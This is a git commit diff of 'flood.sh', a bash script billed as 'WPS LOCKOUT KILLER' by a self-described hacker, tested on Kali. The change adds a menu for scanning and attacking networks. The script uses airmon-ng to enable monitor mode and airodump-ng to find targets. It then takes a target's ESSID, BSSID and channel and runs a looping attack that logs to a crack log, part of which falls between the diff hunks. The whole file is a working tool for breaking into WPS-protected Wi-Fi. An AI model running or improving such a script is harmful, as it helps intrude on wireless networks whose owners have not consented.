014f81eff4fd3182e8028318968f1404e91c5bc7
fantome195 <fantome195@users.noreply.github.com>
2014-09-28 16:43:15 +0100

    Update flood.sh
    Fixing some Problems and make easy to use with menu

--- flood.sh
+++ flood.sh
@@ -4,64 +4,59 @@
 #BETA VERSION
 #TESTED :KALI
 
+menu ()  {
 
- cleaner () 
+clear 
 
-{
-
-i="1";
-
-while [ $i -lt 15 ]; 
-
-do
-
-airmon-ng stop mon$i >> /dev/null
-
-i=$((i+1)) 
-done                     }
-
- monitors ()  {
-echo "\n [+] Starting Monitors ....."
-
-airmon-ng start $interface >> /dev/null
-
-airmon-ng start $interface >> /dev/null
-
-airmon-ng start $interface >> /dev/null
-airmon-ng start $interface >> /dev/null
-airmon-ng start $interface >> /dev/null
+echo "   ############## Welcome To WPS LOCKOUT KILLER V1 ###########";
+echo "   ###########################################################";
+echo "   ##            Full Information                           ##";
+echo "   ##   Author   :      { Fantome195 }                      ##";
+echo "   ##   Country  :      { Morocco   }                       ##";
+echo "   ##   Email    :      { hacker.fantome195@gmail.com }     ##";
+echo "   ##   Website  :      { http://hackshowblog.com }         ##";
+echo "   ###########################################################";
+ 
+echo " 1: Scan Networks  \c"
+echo " 2: Attack Networks  \c"
+echo " 3: Clean & Quit \c"
+echo "\n\n         Your Choice : \c"
+read choice 
 
 
-echo "\n please restart script \n";
+case $choice in 
 
+1)scan;;
+2)attack;;
+3)cleaner;;
+esac
+
+ 
 }
-start ()
-{
-echo "\n             Welcome To WPS LOCKOUT KILLER \n"
+
+
+scan () {
+
 
 echo "\n Please enter your interface name (ex:wlan0 )  : \c" 
 read interface ;
-airmon-ng > /tmp/interface 2>1;
-grep -q mon0 /tmp/interface ;
-if [ $? -eq 0 ] 
 
-then 
+monitors
+
 echo "\n Please Make sure you copy Your Target's BSSID & ESSID & channel  \n";
 
 echo " This  Will Be  Killed After 30 seconds \n"; 
 
 gnome-terminal -e "timeout 40s airodump-ng mon0 ";
+ sleep 20s
+menu
+}
+
+attack () {
+
 read -p " Please enter The ESSID  : " essid ; 
 read -p " Please enter The BSSID  : " bssid ; 
 read -p " Please enter The channel  : " channel ;
-
-else 
-echo " Starting mon0 " 
-airmon-ng start $interface  >> /dev/null ;
-echo " Please restart script " ; 
-
-exit 
-fi 
 
 while true 
 
@@ -98,12 +93,48 @@ tail -f /tmp/cracklog.txt &2>1;
         fi
 
 sleep 7m
- else 
-monitors
-exit ; 
+
 fi
 done
 }
-start
+
+cleaner () { i="1";
+
+while [ $i -lt 15 ]; 
+
+do
+
+airmon-ng stop mon$i >> /dev/null
+
+i=$((i+1)) 
+done }
 
 
+
+monitors ()  {
+echo "\n [+] Starting Monitors ....."
+
+airmon-ng start $interface >> /dev/null
+
+airmon-ng start $interface >> /dev/null
+
+airmon-ng start $interface >> /dev/null
+airmon-ng start $interface >> /dev/null
+airmon-ng start $interface >> /dev/null
+echo "\n [+] Oky Done .  \n";
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+menu
